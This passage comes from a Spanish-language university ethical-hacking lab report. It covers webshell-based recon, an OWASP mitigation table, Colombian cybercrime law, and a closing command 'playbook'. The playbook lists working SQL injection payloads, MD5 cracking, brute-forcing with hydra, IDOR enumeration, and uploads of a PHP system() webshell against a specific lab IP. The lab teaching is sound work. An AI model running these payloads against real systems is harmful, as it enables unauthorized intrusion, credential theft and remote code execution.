                <img src="assets/images/s2_put_repeater_200.png" alt="Burp 200" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Burp Repeater: Aceptación con 200 OK y ruta /uploads/shellnelson.php')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 12.2: Aceptación con código 200 OK y confirmación de ruta</p>
              </div>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2 text-xs">
              <span class="font-bold text-surface-text uppercase font-mono tracking-wider">¿Por qué el servidor rechaza la petición sin autenticación?</span>
              <p class="text-surface-muted leading-relaxed">
                El backend implementa un mecanismo de verificación de sesión (<code class="font-mono">session_start()</code>). Al no recibir en la cabecera <code>Cookie</code> un identificador <code>PHPSESSID</code> vinculado a una sesión activa, el flujo aborta la operación y responde con <strong>401 Unauthorized</strong> (<code class="font-mono">{"error": "No autorizado"}</code>), garantizando que usuarios anónimos no puedan subir archivos a la API.
              </p>
            </div>
          </article>

          <!-- FASE 13: RCE & VARIABLES DE ENTORNO EN SITIO 2 -->
          <article id="s2-fase13" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 13</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 13 — RCE, Post-Explotación & Análisis Forense de Contenedores</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Con el webshell activo en <code>/uploads/shellnelson.php</code>, se ejecutaron comandos de reconocimiento de sistema. Se evaluaron los privilegios del proceso (<code>id</code>), las variables de entorno (<code>env</code>) y el árbol de archivos en <code>/var/www/sitio2/</code>.
            </p>

            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-2">
              <img src="assets/images/s2_webshell_id.png" alt="Sitio 2 id" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Ejecución de id en Sitio 2: uid=33(www-data)')"/>
              <img src="assets/images/s2_webshell_env.png" alt="Sitio 2 env" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Comando env mostrando variables de entorno del contenedor Docker')"/>
              <img src="assets/images/s2_webshell_ls.png" alt="Sitio 2 ls" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Comando ls listando los archivos de /var/www/sitio2/')"/>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2 text-xs">
              <span class="font-bold text-surface-text uppercase font-mono tracking-wider">Hallazgos Críticos de Seguridad en Variables de Entorno:</span>
              <ul class="list-disc pl-5 space-y-1 text-surface-muted">
                <li><strong class="text-surface-text">Aislamiento en Contenedores:</strong> La variable <code class="font-mono">HOSTNAME=8c0f99762685</code> revela un ID hexadecimal típico de un contenedor Docker, confirmando al auditor que se encuentra en un entorno virtualizado.</li>
                <li><strong class="text-surface-text">Versión Exacta de PHP:</strong> <code class="font-mono">PHP_VERSION=8.2.33</code> permite identificar con precisión los módulos compilados y vectores de ataque conocidos para esa versión específica.</li>
                <li><strong class="text-surface-text">Herramientas de Compilación Internas:</strong> <code class="font-mono">PHPIZE_DEPS (gcc, g++, make, autoconf, dpkg-dev)</code> revela la presencia de compiladores de C/C++, lo que facilitaría a un atacante compilar exploits nativos de escalada local.</li>
              </ul>
            </div>
          </article>
        </section>

        <!-- ================= SECTION 03: ANÁLISIS COMPARATIVO OWASP ================= -->
        <section id="matriz-owasp" class="space-y-6 pt-6">
          <div class="flex items-center justify-between border-b border-purple-200 dark:border-purple-900 pb-3">
            <div class="flex items-center gap-3">
              <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-50 text-purple-600 dark:bg-purple-950 dark:text-purple-400 font-mono font-bold text-sm">03</span>
              <div>
                <h2 class="text-2xl font-bold tracking-tight text-surface-text">Pregunta 14 — Matriz Comparativa OWASP Top 10 & Mitigaciones</h2>
                <span class="text-xs text-surface-muted font-mono">Consolidación técnica de los 7 vectores explotados en ambos sitios</span>
              </div>
            </div>
            <span class="px-3 py-1 rounded-full text-xs font-mono font-bold bg-purple-50 text-purple-700 dark:bg-purple-950 dark:text-purple-300 border border-purple-200 dark:border-purple-800">20 Puntos</span>
          </div>

          <!-- Interactive Filter Table -->
          <div class="overflow-x-auto rounded-xl border border-surface-border bg-surface-card shadow-xs">
            <table class="w-full text-left text-xs text-surface-muted">
              <thead class="bg-slate-900 text-white font-mono uppercase text-[11px] tracking-wider">
                <tr>
                  <th class="p-3.5">Vulnerabilidad</th>
                  <th class="p-3.5">Categoría OWASP</th>
                  <th class="p-3.5 text-center">Sitio</th>
                  <th class="p-3.5">Impacto Tríada CIA</th>
                  <th class="p-3.5">Medida de Mitigación Técnica y Concreta</th>
                </tr>
              </thead>
              <tbody class="divide-y divide-surface-border font-sans">
                <tr class="hover:bg-surface-inset transition-colors">
                  <td class="p-3.5 font-bold text-surface-text">Inyección SQL (UNION-based)</td>
                  <td class="p-3.5 font-mono text-brand-600">A03:2021 – Injection</td>
                  <td class="p-3.5 text-center"><span class="px-2 py-0.5 rounded bg-rose-50 text-rose-700 dark:bg-rose-950 dark:text-rose-300 font-mono font-bold">S1</span></td>
                  <td class="p-3.5"><strong class="text-surface-text">Confidencialidad (Alta)</strong><br>Integridad (Media)</td>
                  <td class="p-3.5 leading-relaxed">Implementar consultas preparadas y parametrizadas (Prepared Statements con PDO). Validar entradas y aplicar principio de mínimo privilegio en el usuario de BD.</td>
                </tr>
                <tr class="hover:bg-surface-inset transition-colors">
                  <td class="p-3.5 font-bold text-surface-text">Criptografía Débil (MD5 sin sal)</td>
                  <td class="p-3.5 font-mono text-brand-600">A02:2021 – Cryptographic Failures</td>
                  <td class="p-3.5 text-center"><span class="px-2 py-0.5 rounded bg-rose-50 text-rose-700 dark:bg-rose-950 dark:text-rose-300 font-mono font-bold">S1</span></td>
                  <td class="p-3.5"><strong class="text-surface-text">Confidencialidad (Alta)</strong></td>
                  <td class="p-3.5 leading-relaxed">Migrar a funciones de derivación de claves con sal criptográfica única y factor de coste configurable: <strong>Argon2id</strong> (NIST) o <strong>bcrypt</strong> (coste &ge; 12).</td>
                </tr>
                <tr class="hover:bg-surface-inset transition-colors">
                  <td class="p-3.5 font-bold text-surface-text">Carga Insegura de Archivos (File Upload)</td>
                  <td class="p-3.5 font-mono text-brand-600">A04:2021 – Insecure Design</td>
                  <td class="p-3.5 text-center"><span class="px-2 py-0.5 rounded bg-purple-50 text-purple-700 dark:bg-purple-950 dark:text-purple-300 font-mono font-bold">Ambos</span></td>
                  <td class="p-3.5"><strong class="text-rose-600">Confidencialidad (Crítica)</strong><br><strong class="text-rose-600">Integridad (Crítica)</strong></td>
                  <td class="p-3.5 leading-relaxed">Validar extensiones con lista blanca estricta; verificar firmas binarias (magic bytes con finfo); guardar fuera del webroot y deshabilitar ejecución de scripts en uploads/.</td>
                </tr>
                <tr class="hover:bg-surface-inset transition-colors">
                  <td class="p-3.5 font-bold text-surface-text">Configuración Incorrecta (phpinfo expuesto)</td>
                  <td class="p-3.5 font-mono text-brand-600">A05:2021 – Security Misconfiguration</td>
                  <td class="p-3.5 text-center"><span class="px-2 py-0.5 rounded bg-emerald-50 text-emerald-700 dark:bg-emerald-950 dark:text-emerald-300 font-mono font-bold">S2</span></td>
                  <td class="p-3.5"><strong class="text-surface-text">Confidencialidad (Media)</strong></td>
                  <td class="p-3.5 leading-relaxed">Eliminar archivos de prueba/diagnóstico (info.php) en producción; configurar expose_php = Off, display_errors = Off y proteger variables de entorno.</td>
                </tr>
                <tr class="hover:bg-surface-inset transition-colors">
                  <td class="p-3.5 font-bold text-surface-text">Fuerza Bruta en Login</td>
                  <td class="p-3.5 font-mono text-brand-600">A07:2021 – Auth Failures</td>
                  <td class="p-3.5 text-center"><span class="px-2 py-0.5 rounded bg-emerald-50 text-emerald-700 dark:bg-emerald-950 dark:text-emerald-300 font-mono font-bold">S2</span></td>
                  <td class="p-3.5"><strong class="text-surface-text">Confidencialidad (Alta)</strong><br>Integridad (Media)</td>
                  <td class="p-3.5 leading-relaxed">Implementar límites de tasa (rate limiting por IP), bloqueo progresivo temporal de cuentas tras N fallos consecutivos, CAPTCHA y autenticación de múltiples factores (MFA).</td>
                </tr>
                <tr class="hover:bg-surface-inset transition-colors">
                  <td class="p-3.5 font-bold text-surface-text">Referencia Directa Insegura a Objetos (IDOR)</td>
                  <td class="p-3.5 font-mono text-brand-600">A01:2021 – Broken Access Control</td>
                  <td class="p-3.5 text-center"><span class="px-2 py-0.5 rounded bg-emerald-50 text-emerald-700 dark:bg-emerald-950 dark:text-emerald-300 font-mono font-bold">S2</span></td>
                  <td class="p-3.5"><strong class="text-surface-text">Confidencialidad (Alta)</strong></td>
                  <td class="p-3.5 leading-relaxed">Validar autorización en el backend para confirmar que el usuario autenticado tiene permisos sobre el ID solicitado; emplear identificadores no secuenciales (UUID v4).</td>
                </tr>
                <tr class="hover:bg-surface-inset transition-colors">
                  <td class="p-3.5 font-bold text-surface-text">Falta de Control en Binarios SUID</td>
                  <td class="p-3.5 font-mono text-brand-600">A01:2021 – Broken Access Control</td>
                  <td class="p-3.5 text-center"><span class="px-2 py-0.5 rounded bg-rose-50 text-rose-700 dark:bg-rose-950 dark:text-rose-300 font-mono font-bold">S1</span></td>
                  <td class="p-3.5"><strong class="text-rose-600">Confidencialidad (Total)</strong><br><strong class="text-rose-600">Integridad (Total)</strong></td>
                  <td class="p-3.5 leading-relaxed">Auditar permisos SUID periódicamente; en binarios y scripts administrativos, utilizar exclusivamente rutas absolutas fijas (/sbin/ifconfig) para prevenir PATH hijacking.</td>
                </tr>
              </tbody>
            </table>
          </div>
        </section>

        <!-- ================= SECTION 04: MARCO LEGAL Y ÉTICA ================= -->
        <section id="marco-legal" class="space-y-6 pt-6">
          <div class="flex items-center justify-between border-b border-surface-border pb-3">
            <div class="flex items-center gap-3">
              <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono font-bold text-sm">04</span>
              <div>
                <h2 class="text-2xl font-bold tracking-tight text-surface-text">Pregunta 15 — Ética Profesional & Marco Legal Colombiano</h2>
                <span class="text-xs text-surface-muted font-mono">Reflexión analítica, Ley 1273 de 2009 y Ley 1581 de 2012</span>
              </div>
            </div>
            <span class="px-3 py-1 rounded-full text-xs font-mono font-bold bg-surface-inset text-surface-text border border-surface-border">15 Puntos</span>
          </div>

          <div class="space-y-6 text-sm leading-relaxed text-surface-muted">
            <!-- Inciso A -->
            <div class="p-6 rounded-2xl bg-surface-card border border-surface-border space-y-3 shadow-xs">
              <h3 class="font-bold text-surface-text text-base flex items-center gap-2">
                <span class="material-symbols-outlined text-brand-600">balance</span>
                (a) ¿Qué diferencia existe entre las acciones de este taller y un ataque informático no autorizado?
              </h3>
              <p>
                La diferencia fundamental no reside en los comandos ni en las herramientas técnicas (ambos utilizan <em>Gobuster, cURL, Hydra o Burp Suite</em>), sino en tres principios cardinales: <strong>la autorización explícita, el alcance delimitado y el propósito de las pruebas</strong>.
              </p>
              <p>
                Como estudiantes que estamos adquiriendo estas capacidades técnicas, es natural sentir curiosidad por "ver qué pasa" si probamos estas herramientas en servidores públicos. Sin embargo, en el mundo real, la falta de consentimiento firmado convierte cualquier acción técnica en una conducta penalmente sancionable. Mientras que el hacking ético busca identificar brechas para fortalecer las defensas y proteger los datos de los usuarios, un ataque no autorizado transgrede la intimidad, afecta la disponibilidad de los servicios y busca un provecho económico o causar daño.
              </p>
            </div>

            <!-- Inciso B -->
            <div class="p-6 rounded-2xl bg-surface-card border border-surface-border space-y-3 shadow-xs">
              <h3 class="font-bold text-surface-text text-base flex items-center gap-2">
                <span class="material-symbols-outlined text-brand-600">policy</span>
                (b) Marco Legal Colombiano: Leyes Relevantes
              </h3>
              <p>
                En Colombia existen dos estatutos legales fundamentales que todo profesional de tecnologías de la información debe dominar:
              </p>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
                <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2">
                  <h4 class="font-bold text-surface-text font-mono">1. Ley 1273 de 2009 (Código Penal)</h4>
                  <p class="text-xs">
                    Creó el bien jurídico tutelado <em>"De la protección de la información y de los datos"</em>. Tipifica conductas delictivas como:
                  </p>
                  <ul class="list-disc pl-4 text-xs space-y-1">
                    <li><strong>Art. 269A:</strong> Acceso abusivo a un sistema informático.</li>
                    <li><strong>Art. 269C:</strong> Interceptación de datos informáticos.</li>
                    <li><strong>Art. 269F:</strong> Violación de datos personales.</li>
                  </ul>
                </div>
                <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2">
                  <h4 class="font-bold text-surface-text font-mono">2. Ley 1581 de 2012 (Habeas Data)</h4>
                  <p class="text-xs">
                    Rige el tratamiento, custodia y recolección de datos personales en entidades públicas y privadas. Exige a administradores e ingenieros garantizar medidas de seguridad para impedir la adulteración, pérdida, consulta o uso no autorizado de bases de datos.
                  </p>
                </div>
              </div>
            </div>

            <!-- Inciso C -->
            <div class="p-6 rounded-2xl bg-surface-card border border-surface-border space-y-3 shadow-xs">
              <h3 class="font-bold text-surface-text text-base flex items-center gap-2">
                <span class="material-symbols-outlined text-rose-600">gavel</span>
                (c) Consecuencias Legales de Aplicar Técnicas sin Autorización en Colombia
              </h3>
              <p>
                El despliegue no autorizado de payloads, inyecciones SQL o fuerza bruta sobre sistemas de terceros desencadena consecuencias jurídicas devastadoras:
              </p>
              <ul class="list-disc pl-5 space-y-2 text-xs">
                <li><strong class="text-surface-text">Penas Privativas de la Libertad:</strong> Penas de prisión que oscilan entre <strong>48 y 96 meses (4 a 8 años de cárcel)</strong>, las cuales aumentan agravadamente si se afecta infraestructura del Estado, del sector financiero o redes de telecomunicaciones.</li>
                <li><strong class="text-surface-text">Sanciones Económicas:</strong> Multas que van desde <strong>100 hasta 1.000 salarios mínimos legales mensuales vigentes (SMLMV)</strong>.</li>
                <li><strong class="text-surface-text">Cancelación de Matrícula Profesional:</strong> Procesos disciplinarios ante el Consejo Profesional Nacional de Ingeniería (COPNIA) que inhabilitan de por vida para ejercer la ingeniería.</li>
                <li><strong class="text-surface-text">Responsabilidad Civil & Antecedentes:</strong> Demandas por daños y perjuicios comerciales, sumado a antecedentes judiciales que destruyen cualquier oportunidad de empleo formal en el sector tecnológico.</li>
              </ul>
            </div>

            <!-- Inciso D -->
            <div class="p-6 rounded-2xl bg-surface-card border border-surface-border space-y-3 shadow-xs">
              <h3 class="font-bold text-surface-text text-base flex items-center gap-2">
                <span class="material-symbols-outlined text-emerald-600">handshake</span>
                (d) Aporte del Hacking Ético & Necesidad de Autorización Escrita
              </h3>
              <p>
                El hacking ético permite a las organizaciones adoptar una postura proactiva y preventiva: auditar y solucionar vulnerabilidades críticas antes de que actores maliciosos las aprovechen, resguardando la reputación de la empresa y la privacidad de sus clientes.
              </p>
              <p>
                Para los profesionales de ciberseguridad, la <strong>autorización formal por escrito</strong> es la regla más importante y nuestra única defensa jurídica:
              </p>
              <div class="p-3.5 rounded-xl bg-surface-inset border border-surface-border text-xs space-y-1">
                <p>• <strong>Respaldo Legal:</strong> Sin un documento de <em>Reglas de Compromiso (Rules of Engagement - RoE)</em> firmado por un representante legal facultado, ante la ley cualquier prueba técnica intrusiva se presume automáticamente un delito informático.</p>
                <p>• <strong>Delimitación del Alcance:</strong> Establece con exactitud qué servidores se pueden auditar, qué ventanas de tiempo están autorizadas para no interferir con la operación del negocio y los límites éticos sobre el tratamiento de datos sensibles.</p>
              </div>
            </div>
          </div>
        </section>

        <!-- ================= SECTION 05: CHEATSHEET PLAYBOOK ================= -->
        <section id="cheatsheet" class="space-y-6 pt-6">
          <div class="flex items-center justify-between border-b border-surface-border pb-3">
            <div class="flex items-center gap-3">
              <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono font-bold text-sm">05</span>
              <div>
                <h2 class="text-2xl font-bold tracking-tight text-surface-text">Playbook Rápido de Comandos del Laboratorio</h2>
                <span class="text-xs text-surface-muted font-mono">Consolidado interactivo para ejecutar en terminal de Kali Linux</span>
              </div>
            </div>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
            <div class="p-4 rounded-xl bg-surface-card border border-surface-border space-y-2">
              <span class="font-bold text-rose-600 block">SITIO 1: RECON & SQLI</span>
              <pre class="p-3 rounded-lg bg-slate-900 text-slate-100 overflow-x-auto select-all"><code>gobuster dir -u http://134.209.63.29/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30

curl -s "http://134.209.63.29/search?q=' OR '1'='1"

curl -s "http://134.209.63.29/search?q=' UNION SELECT 1,username,password,role,5,6,7,8 FROM users--"</code></pre>
            </div>

            <div class="p-4 rounded-xl bg-surface-card border border-surface-border space-y-2">
              <span class="font-bold text-rose-600 block">SITIO 1: CRACKING & RCE</span>
              <pre class="p-3 rounded-lg bg-slate-900 text-slate-100 overflow-x-auto select-all"><code>john --format=raw-md5 --wordlist=challenge-wordlist.txt hash.txt
john --show --format=raw-md5 hash.txt

curl -b "session=COOKIE" -F "file=@shell.php;type=application/pdf" http://134.209.63.29/admin/documents

curl "http://134.209.63.29/uploads/WEBSHELL.php?cmd=cat+/var/www/technova/flag1.txt"</code></pre>
            </div>

            <div class="p-4 rounded-xl bg-surface-card border border-surface-border space-y-2">
              <span class="font-bold text-emerald-600 block">SITIO 2: INFO DISCLOSURE & BRUTE FORCE</span>
              <pre class="p-3 rounded-lg bg-slate-900 text-slate-100 overflow-x-auto select-all"><code>curl -s "http://134.209.63.29:8080/info.php" | grep -i "wordlist"

wget http://134.209.63.29:8080/recursos/palabras.txt -O lista.txt

hydra -l admin -P lista.txt -s 8080 134.209.63.29 http-post-form "/envia.php:usuario=^USER^&contrasena=^PASS^&submit=Login:Usuario o contraseña incorrectos." -t 10 -V</code></pre>
            </div>

            <div class="p-4 rounded-xl bg-surface-card border border-surface-border space-y-2">
              <span class="font-bold text-emerald-600 block">SITIO 2: IDOR & HTTP PUT</span>
              <pre class="p-3 rounded-lg bg-slate-900 text-slate-100 overflow-x-auto select-all"><code>curl -s -b "PHPSESSID=..." "http://134.209.63.29:8080/reportes/ver.php?id=[1-150]" -w "%{http_code}\n" -o /dev/null | grep -c "^200$"

curl -X PUT "http://134.209.63.29:8080/api/subir.php?nombre=shell.php" -H "Cookie: PHPSESSID=..." --data '&lt;?php system($_GET["cmd"]); ?&gt;'</code></pre>
            </div>
          </div>
        </section>

        <!-- ================= FOOTER ================= -->
        <footer class="pt-10 border-t border-surface-border text-center text-xs text-surface-muted space-y-2">
          <p>© 2026 Universidad de La Guajira · Facultad de Ingeniería · Hacking Ético</p>
          <p>Proyecto de Auditoría Técnica <strong>HackLog</strong> · Nelson Wilinton Cotes Yepez (0182210015) & Carlos Andrés Martínez Jáuregui (0002620001)</p>
          <p class="font-mono text-[11px] text-surface-muted pt-1">Docente: Luis Ángel Ramírez Mendoza</p>
        </footer>

      </div>
    </main>
  </div>

  <!-- ================= IMAGE LIGHTBOX MODAL ================= -->
  <div id="lightbox" class="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 hidden flex flex-col items-center justify-center p-4" onclick="closeLightbox()">
    <div class="relative max-w-6xl max-h-[90vh] flex flex-col items-center" onclick="event.stopPropagation()">
      <button onclick="closeLightbox()" class="absolute -top-10 right-0 text-white/80 hover:text-white flex items-center gap-1 font-mono text-xs">
        <span class="material-symbols-outlined text-[20px]">close</span>
        <span>Cerrar (Esc)</span>
      </button>
      <img id="lightbox-img" src="" alt="Zoom" class="max-w-full max-h-[80vh] rounded-lg shadow-2xl border border-white/20"/>
      <p id="lightbox-caption" class="text-white/90 text-sm font-sans mt-3 text-center"></p>
    </div>
  </div>

  <!-- ================= JAVASCRIPT LOGIC ================= -->
  <script>
    function copyCode(btn) {
      const pre = btn.closest('div.rounded-xl').querySelector('pre');
      const text = pre.innerText;
      navigator.clipboard.writeText(text).then(() => {
        const original = btn.innerHTML;
        btn.innerHTML = `<span class="material-symbols-outlined text-[14px] text-emerald-400">check</span><span class="text-emerald-400">Copiado</span>`;
        setTimeout(() => {
          btn.innerHTML = original;
        }, 2000);
      });
    }

    function openLightbox(src, caption) {
      document.getElementById('lightbox-img').src = src;
      document.getElementById('lightbox-caption').innerText = caption;
      document.getElementById('lightbox').classList.remove('hidden');
    }
    function closeLightbox() {
      document.getElementById('lightbox').classList.add('hidden');
    }
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') closeLightbox();
    });

    const themeBtn = document.getElementById('theme-toggle');
    const themeIcon = document.getElementById('theme-icon');
    
    function applyTheme(isDark) {
      if (isDark) {
        document.documentElement.classList.add('dark');
        themeIcon.innerText = 'light_mode';
        localStorage.setItem('theme', 'dark');
      } else {
        document.documentElement.classList.remove('dark');
        themeIcon.innerText = 'dark_mode';
        localStorage.setItem('theme', 'light');
      }
    }

    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'dark' || (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
      applyTheme(true);
    } else {
      applyTheme(false);
    }

    themeBtn.addEventListener('click', () => {
      const isDark = document.documentElement.classList.contains('dark');
      applyTheme(!isDark);
    });

    const searchInput = document.getElementById('global-search');
    searchInput.addEventListener('input', (e) => {
      const term = e.target.value.toLowerCase();
      const articles = document.querySelectorAll('article, section');
      articles.forEach(art => {
        if (!term || art.innerText.toLowerCase().includes(term)) {
          art.style.display = '';
        } else {
          art.style.display = 'none';
        }
      });
    });

    document.addEventListener('keydown', (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
        e.preventDefault();
        searchInput.focus();
      }
    });
  </script>
</body>
</html>
